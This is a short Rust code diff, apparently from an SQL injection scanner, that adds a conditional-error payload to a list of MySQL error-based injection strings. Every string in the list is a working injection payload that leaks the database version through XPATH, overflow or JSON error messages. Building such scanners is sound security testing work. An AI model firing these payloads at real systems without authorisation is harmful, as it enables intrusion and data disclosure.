@@ -44,6 +44,9 @@ pub fn mysql_error_payload() -> String {
 /// - `UPDATEXML(1,CONCAT(0x7e,@@version),1)` — `XPATH syntax error` channel
 /// - `EXP(~(...))` — `BIGINT UNSIGNED value is out of range` overflow channel
 /// - `JSON_KEYS(...)` — `Invalid JSON text` channel (MySQL 5.7+)
+/// - `IF(1=1,EXTRACTVALUE(...),'a')` — `PortSwigger` conditional-error shape
+///   (errors only when the condition holds, same `XPATH syntax error`
+///   channel; appended last so `--level` budgets stay byte-identical)
 #[must_use]
 pub fn mysql_error_payloads() -> Vec<String> {
     vec![
@@ -53,6 +56,7 @@ pub fn mysql_error_payloads() -> Vec<String> {
         "' AND UPDATEXML(1,CONCAT(0x7e,@@version,0x7e),1) -- -".to_owned(),
         "' AND EXP(~(SELECT * FROM (SELECT @@version)x)) -- -".to_owned(),
         "' AND (SELECT JSON_KEYS(CONCAT(0x7e,@@version,0x7e))) -- -".to_owned(),
+        "' AND IF(1=1,EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e)),'a') -- -".to_owned(),
     ]
 }
 
